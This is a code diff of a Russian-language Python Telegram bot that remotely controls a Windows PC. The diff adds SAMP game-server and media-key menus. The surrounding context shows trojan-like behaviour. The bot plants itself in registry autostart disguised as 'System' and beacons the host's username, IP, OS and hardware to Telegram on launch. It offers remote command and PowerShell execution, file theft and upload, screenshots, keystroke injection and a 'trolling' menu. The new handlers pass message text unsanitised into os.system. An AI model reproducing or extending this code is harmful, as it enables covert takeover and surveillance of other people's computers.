@@ -24,6 +24,8 @@ config.read("settings.ini")
 chat_id = int(config["Main"]["first_id"])  #1 Доступ
 chat_idd = int(config["Main"]["second_id"]) #2 Доступ
 bot = telebot.TeleBot(config["Main"]["token"], parse_mode=None) #Токен
+samp_route = config["SAMP"]["gtasa_route"]
+raklite_route = config["SAMP"]["raklite_route"]
 
 #Троллинг
 pyautogui.FAILSAFE = False
@@ -68,9 +70,6 @@ def set_autostart_registry(app_name, key_data = None, autostart: bool = True):
 
 set_autostart_registry(app_name='System', key_data=os.path.abspath(__file__))
 
-
-
-
 zapusk = datetime.datetime.now()
 bot.send_message(chat_id, f'🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{zapusk}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n🔑 IP адрес запустившего - *' + str(ip)[2:-1] + f'*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb), parse_mode="Markdown")
 print(str(zapusk) + "|" + " Управление компом v. 1.0 успешно запущено!")
@@ -88,25 +87,47 @@ def start(message):
 
 
 def samp_connect(message):
-    ip = message.text.strip()
+    get_chat_id = message.chat.id
 
-    if ip == '/start':
-        return start()
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        ip = message.text.strip()
 
-    try:
-        samp_route = config["Main"]["gtasa_route"]
-        os.system(f"start {samp_route}\samp.exe {ip}")
-        bot.send_message(message.chat.id, f'Подключаемся к серверу с IP *{ip}*...', parse_mode = "Markdown")
-        console_menu(message)
-        return
-    
-    except:
-        bot.send_message(message.chat.id, f'Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
-        console_menu(message)
-        return
+        if ip == '/start':
+            return start()
+
+        try:
+            bot.send_message(message.chat.id, f'☑️ Подключаемся к серверу с IP *{ip}*...', parse_mode = "Markdown")
+            samp_menu(message)
+            os.system(f'{samp_route}\samp.exe {ip}')
+        
+        except:
+            bot.send_message(message.chat.id, '❌ Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
+            samp_menu(message)
+            return
 
 
 
+def raklite_connect(message):
+    get_chat_id = message.chat.id
+
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        try:
+            if message.text.strip() == '/start':
+                return start(message)
+
+            info = message.text.strip().split(',') # ник,ip,port
+
+            if len(info) != 3:
+                bot.send_message(message.chat.id, '*❌ Вы не дописали все аргументы! Проверьте ваше сообщение и повторите попытку позже*', parse_mode = "Markdown")
+                return samp_menu(message)
+
+            bot.send_message(message.chat.id, f'☑️ Подключаемся к *{info[1]}:{info[2]}*', parse_mode = "Markdown")
+            samp_menu(message)
+            os.system(f'"{raklite_route}\RakSAMP Lite.exe" -n {info[0]} -h {info[1]} -p {info[2]} -z')
+
+        except:
+            bot.send_message(message.chat.id, '❌ Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
+            return samp_menu(message)
 
 
 def powershell_cmd(message):
@@ -621,7 +642,7 @@ def files(message):
         item0=types.KeyboardButton("Создание файлов/папок")
         item1=types.KeyboardButton("Удаление файлов/папок")
         item2=types.KeyboardButton("Изменение файлов")
-        item3=types.KeyboardButton("Открыть файл")
+        item3=types.KeyboardButton("Запустить файл/программу")
         item4=types.KeyboardButton("Скачать файл с ПК")
         item5=types.KeyboardButton("Выгрузить файл на ПК")
         item6=types.KeyboardButton("Назад")
@@ -663,7 +684,7 @@ def check_files(message):
         elif message.text.strip() == '/start':
             start(message)
 
-        elif message.text.strip() == 'Открыть файл':
+        elif message.text.strip() == 'Запустить файл/программу':
             markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
             item0=types.KeyboardButton("Назад")
             markup.add(item0)
@@ -815,12 +836,11 @@ def console_menu(message):
         markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
         item0=types.KeyboardButton("Ввод команд")
         item1=types.KeyboardButton("Запустить Python скрипт")
-        item2=types.KeyboardButton("Зайти на SAMP сервер")
-        item3=types.KeyboardButton("Сделать скриншот")
-        item4=types.KeyboardButton("Открыть сайт")
-        item5=types.KeyboardButton("Создать ошибку")
-        item6=types.KeyboardButton("Информация о ПК")
-        item7=types.KeyboardButton("Назад")
+        item2=types.KeyboardButton("Сделать скриншот")
+        item3=types.KeyboardButton("Открыть сайт")
+        item4=types.KeyboardButton("Создать ошибку")
+        item5=types.KeyboardButton("Информация о ПК")
+        item6=types.KeyboardButton("Назад")
         markup.add(item0)
         markup.add(item1)
         markup.add(item2)
@@ -828,7 +848,6 @@ def console_menu(message):
         markup.add(item4)
         markup.add(item5)
         markup.add(item6)
-        markup.add(item7)
         bot.send_message(message.chat.id, '💻 *Вы в меню консоли!*', reply_markup=markup, parse_mode='Markdown')
         bot.register_next_step_handler(message, console_check)
 
@@ -881,10 +900,6 @@ def console_check(message):
             bot.send_message(message.chat.id, '❗️ *Введите путь скрипта!*', parse_mode='Markdown')
             bot.register_next_step_handler(message, python_scripts)
 
-        elif message.text.strip() == 'Зайти на SAMP сервер':
-            bot.send_message(message.chat.id, '✍️ *Введите IP сервера, на который вы хотите зайти!\n\nP.s. будет использоваться ник, под которым вы играли в последний раз!*', parse_mode='Markdown')
-            bot.register_next_step_handler(message, samp_connect)
-
         elif message.text.strip() == 'Открыть сайт':
             markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
             item0=types.KeyboardButton("Назад")
@@ -931,6 +946,44 @@ def open_site(message):
 
 
 
+def media_buttons(message):
+    get_chat_id = message.chat.id
+
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
+        item0=types.KeyboardButton("Пауза/Старт")
+        item1=types.KeyboardButton("Перемотка вперёд")
+        item2=types.KeyboardButton("Назад")
+        markup.add(item0)
+        markup.add(item1)
+        markup.add(item2)
+        bot.send_message(message.chat.id, '⌨️ *Вы в меню медиа-клавиш!*', reply_markup=markup, parse_mode='Markdown')
+        bot.register_next_step_handler(message, mediabuttons_check)
+
+
+def mediabuttons_check(message):
+    get_chat_id = message.chat.id
+
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        if message.text.strip() == 'Пауза/Старт':
+            keyboard.send('play/pause media')
+            return media_buttons(message)
+
+        elif message.text.strip() == 'Перемотка вперёд':
+            keyboard.send('alt+right')
+            return media_buttons(message)
+
+        elif message.text.strip() == '/start':
+            return start(message)
+
+        elif message.text.strip() == 'Назад':
+            return keyboard_menu(message)
+
+        else:
+            return media_buttons(message)
+
+
+
 
 
 def keyboard_menu(message):
@@ -940,10 +993,12 @@ def keyboard_menu(message):
         markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
         item0=types.KeyboardButton("Напечатать что-то")
         item1=types.KeyboardButton("Нажать клавиши")
-        item2=types.KeyboardButton("Назад")
+        item2=types.KeyboardButton("Медиа-клавиши")
+        item3=types.KeyboardButton("Назад")
         markup.add(item0)
         markup.add(item1)
         markup.add(item2)
+        markup.add(item3)
         bot.send_message(message.chat.id, '⌨️ *Вы в меню клавиатуры!*', reply_markup=markup, parse_mode='Markdown')
         bot.register_next_step_handler(message, keyboard_check)
 
@@ -959,6 +1014,9 @@ def keyboard_check(message):
 
         elif message.text.strip() == 'Нажать клавиши':
             keyboard_keys(message)
+
+        elif message.text.strip() == 'Медиа-клавиши':
+            media_buttons(message)
 
         elif message.text.strip() == '/start':
             start(message)
@@ -996,7 +1054,7 @@ def keyboard_word(message):
         markup.add(item7)
         markup.add(item8)
         markup.add(item9)
-        bot.send_message(message.chat.id, '⌨️ *Впишите то, что хотите написать, или выберите клавиши из списка ниже!*', reply_markup=markup, parse_mode='Markdown')
+        bot.send_message(message.chat.id, '⌨️ *Впишите то, что хотите написать, или выберите клавиши из списка ниже!\nВписать собственное вы может по примеру ниже:\nalt+f4, enter - нажмется alt+f4 вместе, а только потом enter*', reply_markup=markup, parse_mode='Markdown')
         bot.register_next_step_handler(message, keyboard_word2)
 
 def keyboard_word2(message):
@@ -1098,6 +1156,46 @@ def keyboard_keys2(message):
 
 
 
+def samp_menu(message):
+    get_chat_id = message.chat.id
+
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
+        item0=types.KeyboardButton("Подключение к SAMP серверу")
+        item1=types.KeyboardButton("Подключение к RakLaunch Lite")   
+        item2=types.KeyboardButton("Назад")
+        markup.add(item0)
+        markup.add(item1)
+        markup.add(item2)
+        bot.send_message(message.chat.id, '*😇 Вы в меню SAMP!*', reply_markup=markup, parse_mode='Markdown')
+        bot.register_next_step_handler(message, samp_check)
+
+def samp_check(message):
+    get_chat_id = message.chat.id
+
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        cmd = message.text.strip()
+
+        if cmd == "Назад":
+            mainmenu(message)
+
+        elif cmd == "/start":
+            start(message)
+
+        elif message.text.strip() == 'Подключение к SAMP серверу':
+            bot.send_message(message.chat.id, '✍️ *Введите IP сервера, на который вы хотите зайти!\n\nP.s. будет использоваться ник, под которым вы играли в последний раз!*', parse_mode='Markdown')
+            bot.register_next_step_handler(message, samp_connect)
+
+        elif message.text.strip() == 'Подключение к RakLaunch Lite':
+            bot.send_message(message.chat.id, '✍️ *Введите информацию по форме ниже:\nnickname,ip,port\nПример: Little_Bot,127.0.0.1,7777*', parse_mode='Markdown')
+            bot.register_next_step_handler(message, raklite_connect)
+
+        else:
+            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
+            samp_menu(message)
+
+
+
 
 
 def mainmenu(message):
@@ -1110,17 +1208,19 @@ def mainmenu(message):
         item2=types.KeyboardButton("Файлы и папки")
         item3=types.KeyboardButton("Клавиши")
         item4=types.KeyboardButton("Троллинг")
-        item5=types.KeyboardButton("Особые функции")
+        item5=types.KeyboardButton("SAMP функции")
+        item6=types.KeyboardButton("Особые функции")
         markup.add(item0)
         markup.add(item1)
         markup.add(item2)
         markup.add(item3)
         markup.add(item4)
         markup.add(item5)
+        markup.add(item6)
         bot.send_message(message.chat.id, '*📌 Вы в главном меню!*', reply_markup=markup, parse_mode='Markdown')
-        bot.register_next_step_handler(message, check)
+        bot.register_next_step_handler(message, check_main)
 
-def check(message):
+def check_main(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
@@ -1141,6 +1241,9 @@ def check(message):
 
         elif message.text.strip() == 'Особые функции':
             other_functions(message)
+
+        elif message.text.strip() == 'SAMP функции':
+            samp_menu(message)
 
         else:
             bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
